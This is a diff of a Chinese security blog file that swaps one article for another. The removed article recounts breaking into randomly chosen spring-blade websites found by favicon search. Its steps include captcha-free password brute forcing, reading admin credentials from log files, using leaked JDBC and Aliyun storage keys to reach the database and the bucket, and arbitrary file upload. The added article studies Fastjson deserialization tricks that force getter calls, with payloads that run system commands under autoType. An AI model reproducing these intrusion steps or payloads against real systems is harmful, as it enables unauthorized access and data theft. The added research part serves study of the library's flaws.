@@ -1,218 +1,312 @@
-# 对spring-blade框架站点的渗透技术分享
+## parse和parseobject区别
 
-## 前言
+### 结论
 
-在当今网络安全环境中，Web应用程序的安全性已成为企业及个人站点防护的重中之重。随着开源框架和快速开发工具的普及，诸如Blade这样的轻量级Java Web框架得到了广泛应用。然而，随着Web应用的广泛部署，黑客及恶意攻击者也在不断寻找漏洞，以利用框架或其部署的潜在缺陷进行入侵。为确保系统的安全性，定期进行渗透测试显得尤为重要。
+FastJson中的 parse() 和 parseObject()方法都可以用来将JSON字符串反序列化成Java对象，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()。所以进行反序列化时的细节区别在于，parse() 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，而 parseObject() 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。--- 引用https://jlkl.github.io/2021/12/18/Java_07/
 
-文章中涉及的敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担。
+上面说的条件：返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong的getter方法
 
-参考http://www.aqtd.com/nd.jsp?id=6693
+### 分析
 
-## 站点信息寻找
-
-一般我是通过图标去找的，因为特征感很强
-
-https://sns.bladex.cn/article/2我随便搜了一下，有一个社区
-
-![image.png](https://image.3001.net/images/20241206/1733457865_675277c92f035306bd4f9.png!small)
-
-
-
-![image.png](https://image.3001.net/images/20241206/1733457884_675277dc80b4e11a69c3c.png!small)
-
-这样的特征很多，只需要找出icon就ok了
-
-fofa语法
-
-```php
-icon_hash="1047841028"
-```
-
-![image.png](https://image.3001.net/images/20241206/1733457972_6752783454bf822d26de6.png!small)
-
-可以看见还是很多的8000多个
-
-hunter中
-
-hunter可能更方便，进入站点，找到文件
-
-
-
-然后直接放到hunter
-
-![image-20240925205708900](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925205708900.png)
+测试代码
 
 ```java
-web.icon="952438bb6af042855ed192384032e37b"
+package demo2;
+
+import com.alibaba.fastjson.JSON;
+
+import java.io.IOException;
+
+public class FastJsonTest {
+
+    public String name;
+    public String age;
+    public FastJsonTest() {
+    }
+
+    public void setName(String test) {
+        System.out.println("name setter called");
+        this.name = test;
+    }
+
+    public String getName() {
+        System.out.println("name getter called");
+        return this.name;
+    }
+
+    public String getAge(){
+        System.out.println("age getter called");
+        return this.age;
+    }
+
+    public static void main(String[] args) {
+//        Object obj = JSON.parse("{\"@type\":\"demo2.FastJsonTest\",\"name\":\"thisisname\", \"age\":\"thisisage\"}");
+//        System.out.println(obj);
+
+        Object obj2 = JSON.parseObject("{\"@type\":\"demo2.FastJsonTest\",\"name\":\"thisisname\", \"age\":\"thisisage\"}");
+        System.out.println(obj2);
+    }
+
+}
 ```
 
+执行parse() 时，只有 setName() 会被调用。执行parseObject() 时，setName()、getAge()、getName() 均会被调用。
+
+#### parse() 分析
+
+为什么能够调用setter和getter方法核心在createJavaBeanDeserializer方法，因为我们反序列化bean的时候是使用JavaBeanDeserializer去反序列化，而创建它的过程中我们看到javaBeaninfo的build方法
+在这里先获取我们的get方法，但是只有我们的返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong的getter方法
+![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/9e55769d493c4a33b2554874f43e7ab6.png)所以这也是只能调用这些getter方法的原因
+我们看看setter方法，是没有什么限制的，只要是个setter方法就ok
+![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/bbbe4d81ce0d47e095971d031b1c81ad.png)然后看到这里我们就可以想一个问题了
+**为什么会触发getOutputProperties()**
 
 
-![image-20240925205734065](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925205734065.png)
+感觉上 parse() 进行反序列化创建Java类应该只会调用 setter 方法进行成员变量赋值才对，会什么会触发TemplatesImpl类中的 getOutputProperties() 方法呢？
 
+另外 _outputProperties 成员变量和 getOutputProperties() 明明差了一个_字符，是怎么被 FastJson 关联上的?
+可以看到处理逻辑是如果是有_就从第4位开始截取的
 
+#### parseObject()分析
 
-## 弱密码登录+爆破
+为什么它能够调用到全部的setter方法呢？在build步骤是一样的，没有什么区别，关键在这个方法，我们跟进看看
 
-我们随便找一个站
-
-![image-20240925210029719](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925210029719.png)
-
-可惜啊，这个验证码阻拦了我爆破的想法，可以试一试乱输入这个验证码会不会更新
-
-![image-20240925210521869](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925210521869.png)
-
-发现这个验证码根本不会更新，弱密码爆破一波
-
-
-发现密码被hash了，找个hash的字典爆破一下，最后好在运气好，爆出来了一个
-
-![image-20240925214528291](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925214528291.png)
-
-
-
-在个人信息界面可以修改密码和上传头像
-
-![image-20240925214613028](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925214613028.png)
-
-
-
-尝试了文件上传的各种绕过，绕不过
-
-发现这两个点是点不进去的，一点就说没有权限
-
-![image-20240925214857504](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925214857504.png)
-
-
-
-## 寻找数据文件
-
-当时不是说了吗，我正常访问，返回如下
+先看看调用栈
 
 ```java
-{"code":401,"success":false,"data":{},"msg":"请求未授权"}
+getName:20, FastJsonTest (demo2)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:62, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:497, Method (java.lang.reflect)
+get:451, FieldInfo (com.alibaba.fastjson.util)
+getPropertyValue:114, FieldSerializer (com.alibaba.fastjson.serializer)
+getFieldValuesMap:439, JavaBeanSerializer (com.alibaba.fastjson.serializer)
+toJSON:902, JSON (com.alibaba.fastjson)
+toJSON:824, JSON (com.alibaba.fastjson)
+parseObject:206, JSON (com.alibaba.fastjson)
+main:33, FastJsonTest (demo2)**加粗样式**
 ```
 
-首先第一反应肯定是修改回包
+原因还是那句话
+**FastJson中的 parse() 和 parseObject()方法都可以用来将JSON字符串反序列化成Java对象，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()**
+所以会调用到目标类的getter方法
+
+## Fastjson parse突破特殊getter调用限制
+
+了解了上面的知识，所以就会引来一个问题，如果我们底层调用的是parse来解析我们的json格式的，那我们是不是就不能利用一些调用链了
+
+### $ref引用
+
+条件限制
+jdk版本限制
+fastjson>=1.2.36
+开启Autotype
+
+#### 测试代码
 
 ```java
-{"code":200,"success":true,"data":{},"msg":"success"}
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+
+public class Main {
+    public static void main(String[] args) {
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+
+        String payload =
+                "[{\"@type\":\"demo2.User\",\"cmd\":\"calc\"},{\"@type\":\"demo2.User\",\"cmd\":\"notepad.exe\",\"test\":\"test\"},{\"$ref\":\"$[0].cmd\"}]";
+        Object o = JSON.parse(payload);
+    }
+}
 ```
-
-但是不可以
-
-一堆尝试修修改改一下
-
-不行尝试读取一下日志文件
-
-发现了登录信息，喜喜，还有admin，password是md5编码的，去解一下
-
-![image-20240925220727199](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925220727199.png)
-
-
-
-我们拿去爆破一下
-
-![image-20240925220946777](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925220946777.png)
-
-## admin权限用户
-
-![image-20240925221549284](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925221549284.png)
-
-可以看见admin用户功能点多了很多
-
-![image-20240925221244029](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925221244029.png)
-
-
-
-有大量的信息泄露
-
-![image-20240925221459363](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925221459363.png)
-
-获取了很多账号，嘿嘿嘿，又可以去爆破了，但是都有admin了，不需要多此一举了
-
-可以查看日志记录，可以查看到其他用户登录的log，而且password都是一样的
-
-![image-20240925222803858](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925222803858.png)
-
-现在相当于获得所有的用户和密码了
-
-![image-20240925222819555](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925222819555.png)
-
-## 远程jdbc连接
-
-![image-20240925224023414](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925224023414.png)
-
-可以看到是泄露了jdbc的密码和账号，还有jdbc连接的地址的，我们可以远程连接
-
-sql语句select * from users
-
-虽然报错了，但是证明连接是成功了
 
 ```java
-Exception in thread "main" java.sql.SQLSyntaxErrorException: Table 'construct.users' doesn't exist
-	at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:120)
-	at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:97)
-	at com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping.translateException(SQLExceptionsMapping.java:122)
-	at com.mysql.cj.jdbc.StatementImpl.executeQuery(StatementImpl.java:1218)
-	at MYSQL.JDBC_Connection_example.main(JDBC_Connection_example.java:20)
+package demo2;
 
+import java.io.IOException;
+
+public class User {
+    private String cmd;
+    private String test;
+
+    public String getTest() {
+        System.out.println("getTest");
+        return test;
+    }
+
+    public void setTest(String test) {
+        System.out.println("setTest");
+        this.test = test;
+    }
+
+    public String getCmd() throws IOException {
+        Runtime.getRuntime().exec(cmd);
+        System.out.println("getcmd");
+        return cmd;
+    }
+
+    public void setCmd(String cmd) {
+        System.out.println("setcmd");
+        this.cmd = cmd;
+    }
+}
 ```
 
-不过小问题，我们找找表的名字
+运行main类弹出计算机
 
-![image-20240925224335022](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925224335022.png)
+#### 分析调试
 
-尝试查询一下
+首先我们学习一下这个引用
+基本语法：
+JSON 引用（$ref）：允许在 JSON 数据中引用已经解析的对象，避免重复数据
 
-懒得打码了，如下
+```java
+"$ref": "$"：引用根对象。
+"$ref": "$[0]"：引用根数组的第一个元素。
+"$ref": "$.propertyName"：引用根对象的某个属性。
+```
 
-![image-20240925224423541](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925224423541.png)
+明明是谈不了计算机的，结果弹出来了，我们下断点看看过程
 
-然后尝试jdbc命令执行，但是发现不行，因为自己菜
+```java
+getCmd:20, User (demo2)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:62, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:497, Method (java.lang.reflect)
+get:571, FieldInfo (com.alibaba.fastjson.util)
+getPropertyValue:151, FieldSerializer (com.alibaba.fastjson.serializer)
+getFieldValue:616, JavaBeanSerializer (com.alibaba.fastjson.serializer)
+getPropertyValue:3873, JSONPath (com.alibaba.fastjson)
+eval:2354, JSONPath$PropertySegment (com.alibaba.fastjson)
+eval:121, JSONPath (com.alibaba.fastjson)
+handleResovleTask:1599, DefaultJSONParser (com.alibaba.fastjson.parser)
+parse:183, JSON (com.alibaba.fastjson)
+parse:191, JSON (com.alibaba.fastjson)
+parse:147, JSON (com.alibaba.fastjson)
+main:10, Main
+```
 
-当然都能够sql注入了，提取的方法还是有的，这里就不深入研究了
+我们看到在Object value = parser.parse();就已经解析了我们的value，也调用了相应的setter方法赋值了![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/73ba3ad053c74ee0a11f6eb066ee1a88.png)之后调用handleResolveTask就和这个名字一样的意思
+处理 JSON 解析过程中出现的引用解析任务（Resolve Task）。这些任务通常涉及到 JSONPath 引用（例如 `$ref`）的解析和处理
+判断$开头的，然后去实例化我们的JSONPath的eval方法去解析我们的value
+![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/d36428a657494d15a1de42485dff36e8.png)看到eval方法
+设置主类，然后调用eval继续去处理![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/472a1d9dddec4f4d9dba4b4999480b75.png)
+我们的sagment如下![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/b3b0995e41814b4f8d1aa801abb94b12.png)继续调用eval
+![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/b43b548ffb844638b5c060697b29205e.png)根据传入的String调用get方法
 
-## 阿里云储存桶
+#### 低版本不能使用原因
 
-可以看见是泄露了我们的key的，
+需要refValue不为null，并且refValue必须是JSONObject类。如下图
+![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/5d590aad0c5d430c90e5387b42f8c4e0.png)
 
-![image-20240925215210204](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925215210204.png)
+### 通过JSONObject调用
 
-可以接管文件系统了
+#### 小插曲
 
-![image-20240926083954192](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240926083954192.png)
+下面给出代码
 
-可以任意文件读取和任意文件删除下载
+```java
+package demo2;
 
-## 应用密钥泄露
-
-![](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240926013848135.png)
-
-## 任意文件上传
-
-在这个位置我们可以选择上传图片，经过测试，后端是没有验证的
-
-![image-20240926084544469](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240926084544469.png)
-
-保存后就上传成功
-
-![image-20240926084726034](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240926084726034.png)
-
-点击可以下载
-
-![image-20240926084743650](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240926084743650.png)
+import com.alibaba.fastjson.JSON;
 
 
+public class Test {
+    private String id;
 
-不过对文件名做了处理，猜测是时间搓的md5
+    public String getId() {
+        System.out.println("getID");
+        return id;
+    }
 
-可以去验证一下
+    public void setId(String id) {
+        System.out.println("setID");
+        this.id = id;
+    }
 
-![image-20240926084904011](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240926084904011.png)
+    public static void main(String[] args) {
 
-确实是成功了
+        String payload = "[{\"@type\":\"demo2.Test\",\"id\":\"123\"}]";
+        Object o = JSON.parse(payload);
+        System.out.println(o);
+    }
+}
+```
 
-## 最后
+发现竟然调用了我们的get方法
+这是为什么？
+其实是因为我已经把他变成数组了，仔细看外面多了一层[]把我们的数据变成了数组
 
-文章中涉及的敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担。
+结果是
+由于打印的是一个数组对象，数组的 toString() 方法会递归地调用每个元素的 toString() 方法。由于 Test 类没有重写 toString() 方法，这会调用 JSON.toJSONString(o) 来转换对象为 JSON 字符串，这个过程会调用 getId 方法来获取 id 属性值，故打印 getID。
+
+```java
+getId:11, Test (demo2)
+write:-1, ASMSerializer_1_Test (com.alibaba.fastjson.serializer)
+write:135, ListSerializer (com.alibaba.fastjson.serializer)
+write:312, JSONSerializer (com.alibaba.fastjson.serializer)
+toJSONString:1077, JSON (com.alibaba.fastjson)
+toString:1071, JSON (com.alibaba.fastjson)
+valueOf:2994, String (java.lang)
+println:821, PrintStream (java.io)
+main:24, Test (demo2)
+```
+
+发现确实是在print那里调用的，是把我们的字符串打印的时候是把我们的array对象打印出来
+![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/13e1755c74a5463eba910962e5f5cd30.png)所以其实这也给了我们一个提示，我们是不是找一个tostring，把我们的字符串还原为我们的对象的过程
+
+Fastjson使用ASM来代替反射，通过ASM的ClassWriter来生成JavaBeanSerializer的子类，重写write方法，JavaBeanSerializer中的write方法会使用反射从JavaBean中获取相关信息，ASM针对不同类会生成独有的序列化工具类，这里如ASMSerializer_1_Test ，也会调用getter获取类种相关信息
+
+#### 正经过程
+
+##### 测试代码
+
+```java
+package demo2;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+
+
+public class Test {
+    private String id;
+
+    public String getId() {
+        System.out.println("getID");
+        return id;
+    }
+
+    public void setId(String id) {
+        System.out.println("setID");
+        this.id = id;
+    }
+
+    public static void main(String[] args) {
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        String payload = "{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"aaa\":{\"@type\":\"demo2.Test\",\"id\":\"123\"}}";
+        Object o = JSON.parse(payload);
+        System.out.println(o);
+    }
+}
+```
+
+##### 分析调试
+
+巧妙利用了JSONObject.toString ，JSONObject 继承了JSON抽象类
+
+com.alibaba.fastjson.JSON#toString，进行序列化操作，object 转 str
+
+那么我们只要在反序列化过程中，找到一处可以使用JSONObject调用toString的地方就可以了
+
+com.alibaba.fastjson.parser.DefaultJSONParser#parseObject
+会调用我们的key的Tostring![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/2b9a707c33e5433a9f59555b8b0534f5.png)
+Fastjson在解析的时候如果遇到{，会加一层JSONObject，那么只需将key构造成JSONObject，类似{{some}:x} 即可
+![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/011ce22f218641bd9ddb7f3128bf93a9.png)
+
+##### 为什么大于1.2.36版本不行
+
+com.alibaba.fastjson.parser.DefaultJSONParser#parse
+
+直接入口点掐了，不再调用toString函数
+![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/01ffccfa0ff0419cb18998c57b94aabe.png)
